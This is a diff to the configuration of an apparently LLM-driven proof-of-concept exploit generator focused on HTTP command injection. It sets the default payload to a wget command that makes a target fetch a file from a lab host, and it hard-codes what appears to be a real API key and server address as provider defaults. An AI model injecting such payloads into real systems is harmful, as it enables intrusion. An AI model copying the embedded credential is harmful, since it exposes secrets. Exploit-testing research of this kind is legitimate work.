@@ -43,13 +43,13 @@ class LLMSettings(BaseModel):
         if not providers:
             providers = {
                 "deepseek": ProviderSettings(
-                    base_url=os.getenv("POCGEN_DS_BASE_URL", ""),
-                    api_key=os.getenv("POCGEN_DS_API_KEY", ""),
+                    base_url=os.getenv("POCGEN_DS_BASE_URL", "http://222.20.126.10:33330/v1"),
+                    api_key=os.getenv("POCGEN_DS_API_KEY", "sk-IpyjtAxK47UZqLHtYc1lS4ck69W7Qzo3fnc5p5DEiNOblWZk"),
                     model=os.getenv("POCGEN_DS_MODEL", "deepseek-chat"),
                 ),
                 "glm": ProviderSettings(
-                    base_url=os.getenv("POCGEN_GLM_BASE_URL", ""),
-                    api_key=os.getenv("POCGEN_GLM_API_KEY", ""),
+                    base_url=os.getenv("POCGEN_GLM_BASE_URL", "http://222.20.126.10:33330/v1"),
+                    api_key=os.getenv("POCGEN_GLM_API_KEY", "sk-IpyjtAxK47UZqLHtYc1lS4ck69W7Qzo3fnc5p5DEiNOblWZk"),
                     model=os.getenv("POCGEN_GLM_MODEL", "glm-5.1-fp8")
                 )                
             }
@@ -86,7 +86,7 @@ class AppSettings(BaseModel):
     )
     cookie_dir: str = Field(default=os.getenv("POCGEN_COOKIE_DIR", os.path.join(OUTPUT_ROOT_DEFAULT, "cookie")))
     default_vuln_type: str = Field(default=os.getenv("POCGEN_VULN_TYPE", "command_injection_http"))
-    payload: str = Field(default=os.getenv("POCGEN_PAYLOAD", "http://192.168.6.1:6666/testpoc"))
+    payload: str = Field(default=os.getenv("POCGEN_PAYLOAD", "wget http://192.168.6.1:6666/testpoc"))
     http_proxy: str | None = Field(default=os.getenv("POCGEN_HTTP_PROXY"))
     sample_timeout: float = Field(default=float(os.getenv("POCGEN_SAMPLE_TIMEOUT", "8")))
     validation_timeout: float = Field(default=float(os.getenv("POCGEN_VALIDATION_TIMEOUT", "8")))
@@ -94,6 +94,9 @@ class AppSettings(BaseModel):
     max_iterations: int = Field(default=int(os.getenv("POCGEN_MAX_ITERS", "1")))
     stop_on_success: bool = Field(default=os.getenv("POCGEN_STOP_ON_SUCCESS", "true").lower() not in {"0", "false", "no"})
     monitor_timeout: float = Field(default=float(os.getenv("POCGEN_MONITOR_TIMEOUT", "10")))
+    temperature: float = Field(default=float(os.getenv("POCGEN_TEMPERATURE", "0.2")))
+    max_tokens: int = Field(default=int(os.getenv("POCGEN_MAX_TOKENS", "65535")))
+    browser_headless: bool = Field(default=os.getenv("POCGEN_BROWSER_HEADLESS", "true").lower() not in {"0", "false", "no"})
     ida_mcp_url: str = Field(default=os.getenv("POCGEN_IDA_MCP_URL", "http://127.0.0.1:8745/mcp"))
     ida_mcp_bin: str = Field(
         default=os.getenv(
